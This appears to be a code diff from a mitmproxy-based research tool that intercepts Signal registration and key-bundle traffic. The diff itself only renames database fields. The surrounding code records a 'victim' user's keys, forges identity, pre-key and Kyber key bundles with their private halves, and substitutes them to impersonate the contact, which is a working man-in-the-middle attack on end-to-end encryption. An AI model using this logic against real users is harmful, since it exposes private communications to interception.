@@ -162,19 +162,19 @@ def _v1_registration_resp(flow: HTTPFlow):
     ip_address = flow.client_conn.peername[0]
 
     user = User.insert(
-        pNumber=resp["number"],
+        p_number=resp["number"],
         aci=resp["uuid"],
         pni=resp["pni"],
-        isVictim=True
+        is_victim=True
     )
-
+    
     device = Device.insert(
         aci=resp["uuid"],
         pni=resp["pni"],
-        deviceId=1,
-        aciIdenKey=registration_info[ip_address].aci_data.iden_key,
-        pniIdenKey=registration_info[ip_address].pni_data.iden_key,
-        unidentifiedAccessKey=registration_info[ip_address].unidentified_access_key,
+        device_id=1,
+        aci_iden_key=registration_info[ip_address].aci_data.iden_key,
+        pni_iden_key=registration_info[ip_address].pni_data.iden_key,
+        unidentified_access_key=registration_info[ip_address].unidentified_access_key,
     )
 
     user.on_conflict_replace().execute()
@@ -221,24 +221,24 @@ def _v2_keys(flow: HTTPFlow):
     legit_bundle = LegitBundle.insert(
         type=identity,
         aci=registration_info[ip_addr].aci,
-        deviceId=1,  # todo: shouldn't be static
-        IdenKey=key_data.iden_key,
-        SignedPreKey=key_data.signed_pre_key,
-        PreKeys=key_data.pre_keys,
-        kyberKeys=key_data.pq_pre_keys,
-        lastResortKyber=key_data.pq_last_resort_key
+        device_id=1,  # todo: shouldn't be static
+        iden_key=key_data.iden_key,
+        signed_pre_key=key_data.signed_pre_key,
+        pre_keys=key_data.pre_keys,
+        kyber_keys=key_data.pq_pre_keys,
+        last_resort_kyber=key_data.pq_last_resort_key
     )
 
     mitm_bundle = MitMBundle.insert(
         type=identity,
         aci=registration_info[ip_addr].aci,
-        deviceId=1,  # todo: shouldn't be static
-        FakeIdenKey=(b64encode(key_data.fake_iden_key.public_key().serialize()).decode("utf-8"),
-                     b64encode(key_data.fake_iden_key.private_key().serialize()).decode("utf-8")),
-        FakeSignedPreKey=(key_data.fake_signed_pre_keys, key_data.fake_secret_signed_pre_keys),
-        FakePrekeys=(key_data.fake_pre_keys, key_data.fake_secret_pre_keys),
-        fakeKyberKeys=(key_data.fake_pq_pre_keys, key_data.fake_secret_pq_pre_keys),
-        fakeLastResortKyber=(key_data.fake_last_resort_key, key_data.fake_secret_last_resort_key)
+        device_id=1,  # todo: shouldn't be static
+        fake_iden_key=(b64encode(key_data.fake_iden_key.public_key().serialize()).decode("utf-8"),
+                       b64encode(key_data.fake_iden_key.private_key().serialize()).decode("utf-8")),
+        fake_signed_pre_key=(key_data.fake_signed_pre_keys, key_data.fake_secret_signed_pre_keys),
+        fake_pre_keys=(key_data.fake_pre_keys, key_data.fake_secret_pre_keys),
+        fake_kyber_keys=(key_data.fake_pq_pre_keys, key_data.fake_secret_pq_pre_keys),
+        fake_last_resort_kyber=(key_data.fake_last_resort_key, key_data.fake_secret_last_resort_key)
     )
 
     legit_bundle.on_conflict_replace().execute()
@@ -291,12 +291,12 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         legit_bundle = LegitBundle.insert(
             type=identity.lower(),
             aci=uuid,
-            deviceId=device_id,
-            IdenKey=b64encode(bob_identity_key_public).decode("ascii"),
-            SignedPreKey=b64encode(bob_signed_pre_key_public).decode("ascii"),
-            PreKeys=b64encode(bob_pre_key_public).decode("ascii"),
-            kyberKeys=b64encode(bob_kyber_pre_key_public).decode("ascii"),
-            lastResortKyber=b64encode(bob_kyber_pre_key_public).decode("ascii")
+            device_id=device_id,
+            iden_key=b64encode(bob_identity_key_public).decode("ascii"),
+            signed_pre_key=b64encode(bob_signed_pre_key_public).decode("ascii"),
+            pre_keys=b64encode(bob_pre_key_public).decode("ascii"),
+            kyber_keys=b64encode(bob_kyber_pre_key_public).decode("ascii"),
+            last_resort_kyber=b64encode(bob_kyber_pre_key_public).decode("ascii")
         )
         legit_bundle.on_conflict_replace().execute()
         fake_victim.process_pre_key_bundle(ProtocolAddress(uuid, _id), bob_bundle)
@@ -309,7 +309,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         # This should impersonate Bob's info 
         # identity_key = MitMBundle.select().where(MitMBundle.type == identity,
         #                                             MitMBundle.aci == uuid,
-        #                                             MitMBundle.deviceId == device_id).first()
+        #                                             MitMBundle.device_id == device_id).first()
 
         identity_key = bobs_bundle.get(uuid)
 
@@ -354,16 +354,16 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         mitm_bundle = MitMBundle.insert(
             type=identity.lower(),
             aci=uuid,
-            deviceId=device_id,
-            FakeIdenKey=(identity_key.public_key().to_base64(), identity_key.private_key().to_base64()),
-            FakeSignedPreKey=(fake_bundle_wire["devices"][0]["signedPreKey"],
-                              fake_user.signed_pre_key_pair.private_key().to_base64()),
-            FakePrekeys=(fake_bundle_wire["devices"][0]["preKey"],
-                         fake_user.pre_key_pair.private_key().to_base64()),
-            fakeKyberKeys=(fake_bundle_wire["devices"][0]["pqPreKey"],
-                           fake_user.kyber_pre_key_pair.get_private().to_base64()),
-            fakeLastResortKyber=(fake_user.last_resort_kyber.get_public().to_base64(),
-                                 fake_user.last_resort_kyber.get_private().to_base64())
+            device_id=device_id,
+            fake_iden_key=(identity_key.public_key().to_base64(), identity_key.private_key().to_base64()),
+            fake_signed_pre_key=(fake_bundle_wire["devices"][0]["signedPreKey"],
+                                 fake_user.signed_pre_key_pair.private_key().to_base64()),
+            fake_pre_keys=(fake_bundle_wire["devices"][0]["preKey"],
+                           fake_user.pre_key_pair.private_key().to_base64()),
+            fake_kyber_keys=(fake_bundle_wire["devices"][0]["pqPreKey"],
+                             fake_user.kyber_pre_key_pair.get_private().to_base64()),
+            fake_last_resort_kyber=(fake_user.last_resort_kyber.get_public().to_base64(),
+                                    fake_user.last_resort_kyber.get_private().to_base64())
         )
         mitm_bundle.on_conflict_replace().execute()
         mitm_bundles[_id] = mitm_bundle, fake_bundle_wire, fake_user, fake_victims[_id]
@@ -379,7 +379,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
 
 @api.ws_route("/v1/websocket/")
-def _v1_websocket(flow, msg):
+def _v1_websocket(_flow, msg):
     # logging.info(f"WEBSOCKET: {msg}")
     ws_msg = WebSocketMessage()
     ws_msg.ParseFromString(msg.content)
@@ -435,7 +435,7 @@ def _v1_ws_profile(flow, identifier):
     bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()
 
     if bundle:
-        public_fake_iden_key = bundle.FakeIdenKey[0]
+        public_fake_iden_key = bundle.fake_iden_key[0]
     else:
         fake_iden_key = IdentityKeyPair.generate()
         bobs_bundle[uuid] = BobIdenKey(uuid, iden_key, fake_iden_key)
